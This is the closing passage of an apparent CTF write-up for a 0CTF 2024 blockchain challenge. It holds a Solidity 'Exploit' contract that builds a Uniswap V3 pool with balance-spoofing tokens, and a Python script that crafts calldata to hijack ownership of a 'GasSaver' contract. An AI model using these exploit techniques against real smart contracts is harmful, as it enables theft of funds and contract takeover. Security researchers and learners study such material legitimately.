+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;src/Token.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="n">token0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="n">token1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV3Pool</span> <span class="k">public</span> <span class="n">pool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">gasSaver</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">gasSaver_</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gasSaver</span> <span class="o">=</span> <span class="n">gasSaver_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">init</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Deploy tokens
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">tokenA</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Token</span><span class="p">(</span><span class="n">gasSaver</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">tokenB</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Token</span><span class="p">(</span><span class="n">gasSaver</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Sort tokens
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">(</span><span class="kt">address</span> <span class="n">token0_</span><span class="p">,</span> <span class="kt">address</span> <span class="n">token1_</span><span class="p">)</span> <span class="o">=</span> <span class="n">tokenA</span> <span class="o">&lt;</span> <span class="n">tokenB</span> <span class="o">?</span> <span class="p">(</span><span class="n">tokenA</span><span class="p">,</span> <span class="n">tokenB</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="n">tokenB</span><span class="p">,</span> <span class="n">tokenA</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token0</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="n">token0_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token1</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="n">token1_</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Mint to this address for initial liquidity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">token0</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">2</span><span class="o">**</span><span class="mi">255</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token1</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">2</span><span class="o">**</span><span class="mi">255</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Create Uniswap V3 pool
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">IUniswapV3Factory</span> <span class="n">factory</span> <span class="o">=</span> <span class="n">IUniswapV3Factory</span><span class="p">(</span><span class="mh">0x1F98431c8aD98523631AE4a59f267346ea31F984</span><span class="p">);</span> <span class="c1">// Uniswap V3 factory address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pool</span> <span class="o">=</span> <span class="n">IUniswapV3Pool</span><span class="p">(</span><span class="n">factory</span><span class="p">.</span><span class="n">createPool</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">token0</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">token1</span><span class="p">),</span> <span class="mi">500</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">        The goal here is to provide liquidity such that when the pool do a swap callback,
+</span></span></span><span class="line"><span class="cl"><span class="cm">        our given exactAmountIn (which is player address) in the swap can be fully executed.
+</span></span></span><span class="line"><span class="cl"><span class="cm">        Intuitively, easiest way would be to provide huge liquidity on big range of tick.
+</span></span></span><span class="line"><span class="cl"><span class="cm">        */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Initialize it to Tick 800_000 (I just choose random value)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">pool</span><span class="p">.</span><span class="n">initialize</span><span class="p">(</span><span class="mi">18611883644907511909590774894315720731532604461</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Mint in range of Tick -800_000 and 800_100 (I just choose random value with huge range)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Notes that -800_000 is just a random value that I choose
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Provide max allowed liquidity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint128</span> <span class="n">maxLiquidityPerTick</span> <span class="o">=</span> <span class="mi">1917580707794349315672650982405402</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pool</span><span class="p">.</span><span class="n">mint</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="o">-</span><span class="mi">800</span><span class="n">_000</span><span class="p">,</span> <span class="mi">800</span><span class="n">_100</span><span class="p">,</span> <span class="n">maxLiquidityPerTick</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Toggle token0 spoof balance for swap purposes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">token0</span><span class="p">.</span><span class="n">toggleSpoofBalance</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">uniswapV3MintCallback</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount0Owed</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount1Owed</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amount0Owed</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token0</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount0Owed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amount1Owed</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token1</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount1Owed</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, after deploying the <code>Exploit</code> and calling <code>init()</code> on it, we can prepare the <code>calldata</code> that we should pass to the <code>GasSaver</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pool</span>   <span class="o">=</span> <span class="mh">0x00000000000000000000000028ef9f0e8e8edc22d62da8d432bb7a8291c1baa5</span>
+</span></span><span class="line"><span class="cl"><span class="n">token0</span> <span class="o">=</span> <span class="mh">0x0000000000000000000000004403bdab9c3001fdc08cdcfc51d76a6622747b0a</span>
+</span></span><span class="line"><span class="cl"><span class="n">token1</span> <span class="o">=</span> <span class="mh">0x0000000000000000000000004b75b37ba3a1226f227546eeeb3bdb9987eccafc</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0xd3&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;44&#39;</span> <span class="c1"># one-time MSTORE index</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;00&#39;</span> <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">token0</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="c1"># token 0 address</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">token1</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;01f4&#39;</span> <span class="c1"># fee</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;049e&#39;</span> <span class="c1"># Jump location</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pool</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span> <span class="c1"># target address call</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;000000000000000000000000&#39;</span> <span class="o">+</span> <span class="n">player</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span> <span class="c1"># swap amount, which is player address</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Remember that we have a one-time <code>mstore</code> ability during execution of the <code>0xd3</code> path. I use it to set the <code>amount</code> of the <code>swap()</code>. Another thing to notice is that the address we call (which is taken from <code>CALLDATALOAD[0x23]</code>) is a bit dirty, but it&rsquo;s fine because the upper 12 bytes won&rsquo;t be used and only the last 20 bytes will be used for the <code>address</code> of the call.</p>
+<p>Now, we can simply call the <code>GasSaver</code> with this calldata, and we will become the <code>owner()</code> :).</p>
+<img src="https://i.imgur.com/tlFAqZF.png"/>
+<blockquote>
+<p><strong>Flag: 0ops{Gr34t_EtH_gReAt_UuU_Yr_S0_G00d_4t_rev_and_Unisw4p_0x65DDbaBF2d31E444c0929BbE54f17eafE91A879a}</strong></p>
+</blockquote>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/0ctf-2024/" data-title="0CTF 2024" data-via="Chovid99" data-hashtags="Writeup,0CTF,blockchain,evm,rev,uniswap,jop,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/0ctf-2024/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/0ctf/">0CTF</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a>,&nbsp;<a href="/tags/evm/">Evm</a>,&nbsp;<a href="/tags/rev/">Rev</a>,&nbsp;<a href="/tags/uniswap/">Uniswap</a>,&nbsp;<a href="/tags/jop/">Jop</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/seccon-ctf-13-quals/" class="prev" rel="prev" title="SECCON CTF 13 Quals"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>SECCON CTF 13 Quals</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
+</html>
